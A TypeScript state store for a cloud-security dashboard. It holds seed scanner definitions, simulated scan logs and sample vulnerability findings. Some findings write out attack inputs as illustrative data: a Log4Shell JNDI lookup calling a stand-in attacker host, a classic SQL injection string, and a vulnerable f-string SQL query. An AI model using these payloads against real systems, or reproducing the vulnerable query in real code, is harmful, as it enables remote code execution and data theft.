"use client";

import { create } from 'zustand';
import type {
  SecurityFinding,
  ScannerDefinition,
  SBOMEntry,
  SecuritySummary,
  FindingSeverity,
  FindingCategory,
} from '@cloudguard/types';

const SCANNER_API = 'http://localhost:4002';

// ─── Seed data (fallback when scanner-runtime isn't running) ──────────────────

const SEED_SCANNERS: ScannerDefinition[] = [
  { id: 'trivy',       name: 'Trivy',              version: '0.52.2', category: 'container',    description: 'Container & IaC vulnerability scanner',         status: 'idle', lastRunAt: null, lastRunDurationMs: 0, findingsCount: 0, criticalCount: 0, healthScore: 98, supportsRealtime: true  },
  { id: 'grype',       name: 'Grype',              version: '0.78.0', category: 'container',    description: 'Container image vulnerability scanner by Anchore', status: 'idle', lastRunAt: null, lastRunDurationMs: 0, findingsCount: 0, criticalCount: 0, healthScore: 95, supportsRealtime: false },
  { id: 'syft',        name: 'Syft',               version: '1.5.0',  category: 'sbom',         description: 'SBOM generation from containers and filesystems',  status: 'idle', lastRunAt: null, lastRunDurationMs: 0, findingsCount: 0, criticalCount: 0, healthScore: 97, supportsRealtime: false },
  { id: 'semgrep',     name: 'Semgrep',            version: '1.75.0', category: 'sast',         description: 'Static analysis for 30+ languages',                status: 'idle', lastRunAt: null, lastRunDurationMs: 0, findingsCount: 0, criticalCount: 0, healthScore: 92, supportsRealtime: true  },
  { id: 'checkov',     name: 'Checkov',            version: '3.2.102',category: 'iac',          description: 'IaC security scanning for Terraform, K8s, CF',     status: 'idle', lastRunAt: null, lastRunDurationMs: 0, findingsCount: 0, criticalCount: 0, healthScore: 94, supportsRealtime: false },
  { id: 'trufflehog',  name: 'TruffleHog',        version: '3.79.5', category: 'secrets',      description: 'Secret scanning with live credential verification',  status: 'idle', lastRunAt: null, lastRunDurationMs: 0, findingsCount: 0, criticalCount: 0, healthScore: 99, supportsRealtime: true  },
  { id: 'gitleaks',    name: 'Gitleaks',           version: '8.18.4', category: 'secrets',      description: 'Detect secrets in git repositories',                status: 'idle', lastRunAt: null, lastRunDurationMs: 0, findingsCount: 0, criticalCount: 0, healthScore: 96, supportsRealtime: false },
  { id: 'falco',       name: 'Falco',              version: '0.38.1', category: 'runtime',      description: 'eBPF-based Kubernetes runtime security',            status: 'idle', lastRunAt: null, lastRunDurationMs: 0, findingsCount: 0, criticalCount: 0, healthScore: 91, supportsRealtime: true  },
  { id: 'kube-bench',  name: 'kube-bench',        version: '0.8.0',  category: 'kubernetes',   description: 'CIS Kubernetes Benchmark assessment',              status: 'idle', lastRunAt: null, lastRunDurationMs: 0, findingsCount: 0, criticalCount: 0, healthScore: 93, supportsRealtime: false },
  { id: 'kube-hunter', name: 'kube-hunter',       version: '0.6.8',  category: 'kubernetes',   description: 'Active Kubernetes penetration testing',            status: 'idle', lastRunAt: null, lastRunDurationMs: 0, findingsCount: 0, criticalCount: 0, healthScore: 88, supportsRealtime: false },
  { id: 'owasp-zap',   name: 'OWASP ZAP',         version: '2.15.0', category: 'api',          description: 'Dynamic API and web application security testing',  status: 'idle', lastRunAt: null, lastRunDurationMs: 0, findingsCount: 0, criticalCount: 0, healthScore: 87, supportsRealtime: false },
  { id: 'codeql',      name: 'CodeQL',             version: '2.17.6', category: 'sast',         description: 'GitHub semantic code vulnerability analysis',       status: 'idle', lastRunAt: null, lastRunDurationMs: 0, findingsCount: 0, criticalCount: 0, healthScore: 96, supportsRealtime: false },
  { id: 'dependabot',  name: 'Dependabot',        version: 'latest', category: 'dependency',   description: 'Automated dependency vulnerability detection',      status: 'idle', lastRunAt: null, lastRunDurationMs: 0, findingsCount: 0, criticalCount: 0, healthScore: 94, supportsRealtime: true  },
  { id: 'opa',         name: 'Open Policy Agent', version: '0.65.0', category: 'compliance',   description: 'Policy-as-code compliance enforcement',            status: 'idle', lastRunAt: null, lastRunDurationMs: 0, findingsCount: 0, criticalCount: 0, healthScore: 95, supportsRealtime: false },
  { id: 'kyverno',     name: 'Kyverno',            version: '1.12.5', category: 'kubernetes',   description: 'Kubernetes-native policy admission control',        status: 'idle', lastRunAt: null, lastRunDurationMs: 0, findingsCount: 0, criticalCount: 0, healthScore: 92, supportsRealtime: true  },
];

// ─── Local scan log sequences ──────────────────────────────────────────────────

const LOCAL_LOGS: Record<string, string[]> = {
  trivy:       ['[trivy] Loading vulnerability database...','[trivy] Scanning container layers...','[trivy] CVE-2024-3094: xz-utils 5.6.0 — CRITICAL','[trivy] CVE-2024-21626: runc 1.1.11 — CRITICAL','[trivy] Scan complete: 4 critical, 8 high, 23 medium'],
  grype:       ['[grype] Generating SBOM...','[grype] Matching against NVD, OSV, GitHub Advisory...','[grype] CVE-2024-24790: stdlib — CRITICAL','[grype] 3 CISA KEV CVEs detected','[grype] Scan complete: 2 critical, 6 high'],
  semgrep:     ['[semgrep] Loading OWASP Top 10 ruleset...','[semgrep] Scanning 147 repositories...','[semgrep] CRITICAL: SQL injection in users.py:L47','[semgrep] HIGH: Hardcoded secret in config.js','[semgrep] Scan complete: 1 critical, 3 high, 12 medium'],
  checkov:     ['[checkov] Scanning Terraform configurations...','[checkov] CKV_AWS_24: SG allows 0.0.0.0/0:22 — CRITICAL','[checkov] CKV_AWS_78: RDS publicly_accessible=true — HIGH','[checkov] Passed: 312 | Failed: 34','[checkov] Scan complete'],
  trufflehog:  ['[trufflehog] Scanning 147 repos, 89K commits...','[trufflehog] VERIFIED: AWS Access Key — CRITICAL','[trufflehog] VERIFIED: GitHub PAT — CRITICAL','[trufflehog] 2 verified secrets, 4 unverified'],
  gitleaks:    ['[gitleaks] Loading secret detection rules...','[gitleaks] LEAK: Stripe sk_live_ key in tests/fixtures.json','[gitleaks] LEAK: JWT secret in .env.example','[gitleaks] 3 leaks found'],
  falco:       ['[falco] eBPF probe attached to 1,247 pods...','[falco] ALERT: Shell spawned in payment-processor (uid=0)','[falco] ALERT: Outbound connection to known C2 IP','[falco] 3 critical alerts'],
  'kube-bench':['[kube-bench] CIS Benchmark v1.8...','[kube-bench] FAIL: API server anonymous-auth','[kube-bench] FAIL: etcd not encrypted','[kube-bench] Score: 67/100'],
  'owasp-zap': ['[zap] Spidering 234 API endpoints...','[zap] CRITICAL: SQL injection confirmed in /api/v1/users/search','[zap] HIGH: Reflected XSS in /api/v1/search','[zap] Scan complete: 1 critical, 2 high'],
  codeql:      ['[codeql] Building QL database...','[codeql] CRITICAL: User input → SQL query (taint flow)','[codeql] HIGH: SSRF via user-controlled URL','[codeql] Scan complete: 1 critical, 2 high'],
  dependabot:  ['[dependabot] Scanning dependency manifests...','[dependabot] CRITICAL: log4j 2.14.1 — Log4Shell (CVE-2021-44228)','[dependabot] CRITICAL: lodash 4.17.20 — Prototype Pollution','[dependabot] 47 vulnerable packages, 12 with exploits'],
  opa:         ['[opa] Evaluating 234 policies...','[opa] FAIL: resource-limits-required (234 containers)','[opa] FAIL: deny-privileged-containers (3 deployments)','[opa] Compliance: 71%'],
  kyverno:     ['[kyverno] Admission policy evaluation...','[kyverno] FAIL: require-run-as-non-root (34 containers)','[kyverno] FAIL: disallow-latest-tag (12 pods)','[kyverno] 138 violations found'],
  'kube-hunter':['[kube-hunter] Hunting cluster vulnerabilities...','[kube-hunter] VULN: API accessible from node network','[kube-hunter] VULN: etcd on port 2379 accessible','[kube-hunter] 2 vulnerabilities found'],
  syft:        ['[syft] Generating SBOM from container layers...','[syft] 87,432 packages catalogued','[syft] 234 vulnerable packages identified','[syft] SBOM export: CycloneDX 1.4 format'],
};

const LOCAL_FINDINGS: Record<string, SecurityFinding[]> = {
  trivy:      [{ id: 'f-trivy-001', scanner: 'trivy', category: 'container', title: 'CVE-2024-3094: XZ Utils Backdoor (Supply Chain RCE)', description: 'XZ Utils 5.6.0 backdoor allows unauthenticated RCE via OpenSSH.', severity: 'critical', cvss: 10.0, epss: 0.9412, cve: 'CVE-2024-3094', cwe: 'CWE-506', mitre: 'T1195.001', resource: 'registry.cloudguard.io/payment-api:2.1.4', resourceType: 'ContainerImage', provider: 'docker', location: 'xz-utils@5.6.0', evidence: 'xz-utils==5.6.0 detected in OS layer', recommendation: 'Upgrade xz-utils to 5.4.6. Rebuild image.', fixVersion: '5.4.6', aiEnrichment: { rootCause: 'Supply chain attack in xz-utils compression library.', businessImpact: 'Full RCE on production payment containers.', attackScenario: 'Attacker sends crafted SSH → backdoor executes → root access.', mitreTactic: 'Initial Access', mitreTechnique: 'T1195.001 — Supply Chain Compromise', developerGuidance: 'Rebuild image with xz-utils 5.4.6.', effort: 'low', confidence: 99, executiveSummary: 'Critical supply chain attack. All affected containers must be rebuilt immediately.' }, status: 'open', discoveredAt: new Date().toISOString(), correlatedWith: [], tags: ['supply-chain', 'cisa-kev', 'rce'] }],
  semgrep:    [{ id: 'f-semgrep-001', scanner: 'semgrep', category: 'sast', title: 'SQL Injection via Unsanitized User Input', description: 'User-controlled input directly concatenated into SQL query without parameterization.', severity: 'critical', cvss: 9.8, cwe: 'CWE-89', mitre: 'T1190', resource: 'org/cloudguard-enterprise/apps/api', resourceType: 'Repository', provider: 'github', location: 'apps/api/routes/users.py:L47', evidence: "query = f\"SELECT * FROM users WHERE name LIKE '%{request.args['q']}%'\"", recommendation: 'Use parameterized queries.', aiEnrichment: { rootCause: 'f-string SQL interpolation instead of parameterized queries.', businessImpact: 'Entire user database exposed.', attackScenario: "Payload: ' OR '1'='1 → dumps all records.", mitreTactic: 'Initial Access', mitreTechnique: 'T1190 — Exploit Public-Facing Application', developerGuidance: 'Use cursor.execute(query, params).', effort: 'trivial', confidence: 98, executiveSummary: 'Critical SQL injection in production API.' }, status: 'open', discoveredAt: new Date().toISOString(), correlatedWith: [], tags: ['owasp-a03', 'sql-injection'] }],
  checkov:    [{ id: 'f-checkov-001', scanner: 'checkov', category: 'iac', title: 'CKV_AWS_24: Security Group Allows Unrestricted SSH (0.0.0.0/0:22)', description: 'AWS Security Group permits inbound SSH from any IP address.', severity: 'critical', cvss: 9.1, cwe: 'CWE-284', mitre: 'T1021.004', resource: 'aws_security_group.payment_service_sg', resourceType: 'FirewallRule', provider: 'aws', location: 'terraform/modules/ec2/main.tf:L34', evidence: 'ingress { cidr_blocks = ["0.0.0.0/0"], port = 22 }', recommendation: 'Restrict SSH to VPN CIDR. Use SSM Session Manager.', aiEnrichment: { rootCause: 'Debug SSH rule left open in production.', businessImpact: 'Payment servers exposed to internet SSH brute force.', attackScenario: 'Attacker brute forces SSH → server access → credential theft.', mitreTactic: 'Lateral Movement', mitreTechnique: 'T1021.004 — Remote Services: SSH', terraformPatch: 'cidr_blocks = ["10.0.0.0/8"] # VPN only', developerGuidance: 'Restrict to VPN CIDR or use SSM.', effort: 'low', confidence: 100, executiveSummary: 'Production payment servers have SSH open to internet. P0 misconfiguration.' }, status: 'open', discoveredAt: new Date().toISOString(), correlatedWith: [], tags: ['network', 'ssh', 'terraform'] }],
  trufflehog: [{ id: 'f-trufflehog-001', scanner: 'trufflehog', category: 'secrets', title: 'Verified AWS Access Key Leaked in Git History', description: 'Live AWS Access Key found in git commit history. Verified active via STS.', severity: 'critical', cvss: 9.9, epss: 0.9812, cwe: 'CWE-798', mitre: 'T1552.001', resource: 'org/cloudguard-enterprise/repo/infra', resourceType: 'Repository', provider: 'github', location: 'commit a3f82b1 — terraform/variables.tf:L8', evidence: 'AWS_ACCESS_KEY_ID: AKIA[REDACTED]XAMPLE — VERIFIED LIVE', recommendation: 'Immediately revoke IAM key. Rotate all credentials. Audit CloudTrail.', aiEnrichment: { rootCause: 'Developer hardcoded AWS credentials in Terraform.', businessImpact: 'Full AWS account compromise possible.', attackScenario: 'aws sts get-caller-identity → AdministratorAccess → full account takeover.', mitreTactic: 'Credential Access', mitreTechnique: 'T1552.001 — Credentials In Files', developerGuidance: 'Deactivate key in IAM console. Audit CloudTrail.', effort: 'medium', confidence: 100, executiveSummary: 'Live AWS credential in public git history. Immediate revocation required.' }, status: 'open', discoveredAt: new Date().toISOString(), correlatedWith: [], tags: ['secrets', 'aws', 'verified'] }],
  falco:      [{ id: 'f-falco-001', scanner: 'falco', category: 'runtime', title: 'Shell Spawned Inside Production Container (uid=0)', description: 'bash spawned inside payment-processor container running as root.', severity: 'critical', cvss: 9.0, mitre: 'T1059.004', resource: 'eks-prod-main / payment-processor-7d8f9b', resourceType: 'ContainerCluster', provider: 'kubernetes', location: 'Pod: payment-processor-7d8f9b / Namespace: production', evidence: 'Process: /bin/bash (uid=0) spawned at 2024-07-14T06:23:11Z', recommendation: 'Isolate pod. Investigate kubectl exec audit logs.', aiEnrichment: { rootCause: 'Shell spawned in production container — possible RCE or kubectl exec.', businessImpact: 'Attacker can read env vars, exfiltrate data, pivot in cluster.', attackScenario: 'Shell → read DB credentials → curl internal services → data exfiltration.', mitreTactic: 'Execution', mitreTechnique: 'T1059.004 — Unix Shell', yamlPatch: 'securityContext: runAsNonRoot: true, readOnlyRootFilesystem: true', developerGuidance: 'IMMEDIATE: Isolate pod. Check kubectl exec audit logs.', effort: 'high', confidence: 97, executiveSummary: 'ACTIVE THREAT: Shell in production payment container running as root.' }, status: 'open', discoveredAt: new Date().toISOString(), correlatedWith: [], tags: ['runtime', 'active-threat', 'shell'] }],
  dependabot: [{ id: 'f-dependabot-001', scanner: 'dependabot', category: 'dependency', title: 'CVE-2021-44228: Log4Shell RCE in log4j 2.14.1', description: 'Log4Shell JNDI injection allows RCE in 3 Java microservices.', severity: 'critical', cvss: 10.0, epss: 0.9998, cve: 'CVE-2021-44228', cwe: 'CWE-917', mitre: 'T1203', resource: 'org/cloudguard-enterprise/services/analytics-engine', resourceType: 'Repository', provider: 'github', location: 'pom.xml — log4j-core:2.14.1', evidence: 'log4j-core:2.14.1 in Maven dependency tree', recommendation: 'Upgrade to log4j-core 2.17.1+.', fixVersion: '2.17.1', aiEnrichment: { rootCause: 'log4j JNDI lookup processes user-controlled strings.', businessImpact: 'Any service logging user input vulnerable to RCE.', attackScenario: 'User-Agent: ${jndi:ldap://attacker.com/x} → RCE.', mitreTactic: 'Execution', mitreTechnique: 'T1203 — Exploitation for Client Execution', developerGuidance: 'mvn set version log4j-core 2.17.1. Apply -Dlog4j2.formatMsgNoLookups=true.', effort: 'low', confidence: 100, executiveSummary: 'Log4Shell present in production Java services. Single HTTP request = RCE.' }, status: 'open', discoveredAt: new Date().toISOString(), correlatedWith: [], tags: ['log4shell', 'rce', 'java', 'cvss-10'] }],
};

// ─── Store interface ──────────────────────────────────────────────────────────

interface FilterState {
  severity: FindingSeverity | 'all';
  category: FindingCategory | 'all';
  scanner: string | 'all';
}

interface SecurityStore {
  scanners: ScannerDefinition[];
  findings: SecurityFinding[];
  summary: SecuritySummary | null;
  sbom: SBOMEntry[];
  activeScanId: string | null;
  scanLogs: Record<string, string[]>;
  selectedFindingId: string | null;
  filters: FilterState;
  fetchScanners: () => Promise<void>;
  fetchFindings: () => Promise<void>;
  fetchSummary: () => Promise<void>;
  fetchSBOM: (resourceId: string) => Promise<void>;
  triggerScan: (scannerId: string) => void;
  selectFinding: (id: string | null) => void;
  setFilters: (f: Partial<FilterState>) => void;
  appendScanLog: (scannerId: string, log: string) => void;
  updateScannerStatus: (scannerId: string, status: ScannerDefinition['status'], extra?: Partial<ScannerDefinition>) => void;
  addFindings: (findings: SecurityFinding[]) => void;
  computeLocalSummary: () => void;
  simulateLocalScan: (scannerId: string) => void;
}

// ─── Store ─────────────────────────────────────────────────────────────────────

export const useSecurityStore = create<SecurityStore>((set, get) => ({
  scanners: SEED_SCANNERS,
  findings: [],
  summary: null,
  sbom: [],
  activeScanId: null,
  scanLogs: {},
  selectedFindingId: null,
  filters: { severity: 'all', category: 'all', scanner: 'all' },

  fetchScanners: async () => {
    try {
      const res = await fetch(`${SCANNER_API}/api/v1/scanners`);
      if (!res.ok) return;
      const data = await res.json();
      set({ scanners: data.scanners ?? SEED_SCANNERS });
    } catch { /* keep seed data */ }
  },

  fetchFindings: async () => {
    try {
      const res = await fetch(`${SCANNER_API}/api/v1/findings`);
      if (!res.ok) return;
      const data = await res.json();
      set({ findings: data.findings ?? [] });
      get().computeLocalSummary();
    } catch { /* no findings loaded */ }
  },

  fetchSummary: async () => {
    try {
      const res = await fetch(`${SCANNER_API}/api/v1/intelligence/summary`);
      if (!res.ok) { get().computeLocalSummary(); return; }
      const data = await res.json();
      set({ summary: data });
    } catch { get().computeLocalSummary(); }
  },

  fetchSBOM: async (resourceId: string) => {
    try {
      const res = await fetch(`${SCANNER_API}/api/v1/sbom/${resourceId}`);
      if (!res.ok) return;
      const data = await res.json();
      set({ sbom: data.sbom ?? [] });
    } catch { /* no sbom */ }
  },

  triggerScan: (scannerId: string) => {
    set(s => ({ scanLogs: { ...s.scanLogs, [scannerId]: [] } }));
    get().updateScannerStatus(scannerId, 'running');

    // Try real API first
    const tryReal = async () => {
      try {
        const res = await fetch(`${SCANNER_API}/api/v1/scans/trigger`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ scannerId }),
        });
        if (!res.ok) throw new Error('API not available');
        const { jobId } = await res.json();

        const es = new EventSource(`${SCANNER_API}/api/v1/scans/${jobId}/stream`);
        es.onmessage = (event) => {
          const data = JSON.parse(event.data);
          if (data.type === 'LOG') {
            get().appendScanLog(scannerId, data.log);
          } else if (data.type === 'FINDING') {
            get().addFindings([data.finding]);
          } else if (data.type === 'COMPLETE') {
            es.close();
            get().updateScannerStatus(scannerId, 'completed', {
              findingsCount: data.findingsCount,
              lastRunAt: new Date().toISOString(),
            });
            get().computeLocalSummary();
          }
        };
        es.onerror = () => { es.close(); };
      } catch {
        // Fallback to local simulation
        get().simulateLocalScan(scannerId);
      }
    };
    tryReal();
  },

  simulateLocalScan: (scannerId: string) => {
    const logs = LOCAL_LOGS[scannerId] ?? ['[INFO] Scan complete.'];
    const findings = LOCAL_FINDINGS[scannerId] ?? [];
    let index = 0;

    const tick = () => {
      if (index >= logs.length) {
        get().addFindings(findings);
        get().updateScannerStatus(scannerId, 'completed', {
          findingsCount: findings.length,
          criticalCount: findings.filter(f => f.severity === 'critical').length,
          lastRunAt: new Date().toISOString(),
          lastRunDurationMs: logs.length * 500,
        });
        get().computeLocalSummary();
        return;
      }
      get().appendScanLog(scannerId, logs[index]);
      index++;
      setTimeout(tick, 500);
    };
    setTimeout(tick, 200);
  },

  selectFinding: (id) => set({ selectedFindingId: id }),

  setFilters: (f) => set(s => ({ filters: { ...s.filters, ...f } })),

  appendScanLog: (scannerId, log) => {
    set(s => ({
      scanLogs: { ...s.scanLogs, [scannerId]: [...(s.scanLogs[scannerId] ?? []), log] },
    }));
  },

  updateScannerStatus: (scannerId, status, extra = {}) => {
    set(s => ({
      scanners: s.scanners.map(sc =>
        sc.id === scannerId ? { ...sc, status, ...extra } : sc
      ),
    }));
  },

  addFindings: (incoming) => {
    set(s => {
      const existing = new Set(s.findings.map(f => f.id));
      const novel = incoming.filter(f => !existing.has(f.id));
      return { findings: [...s.findings, ...novel] };
    });
  },

  computeLocalSummary: () => {
    const findings = get().findings;
    const open = findings.filter(f => f.status === 'open');
    const critical = open.filter(f => f.severity === 'critical').length;
    const high     = open.filter(f => f.severity === 'high').length;
    const medium   = open.filter(f => f.severity === 'medium').length;
    const low      = open.filter(f => f.severity === 'low').length;
    const score = Math.max(0, 100 - critical * 12 - high * 5 - medium * 2 - low * 0.5);
    set({
      summary: {
        totalFindings: open.length,
        critical, high, medium, low, info: 0,
        securityScore: Math.round(score),
        scannedResources: 4762,
        activeScans: get().scanners.filter(s => s.status === 'running').length,
        secretsDetected: open.filter(f => f.category === 'secrets').length,
        complianceScore: 71,
        lastScanAt: new Date().toISOString(),
        trendDirection: critical > 3 ? 'degrading' : 'stable',
      },
    });
  },
} as SecurityStore));
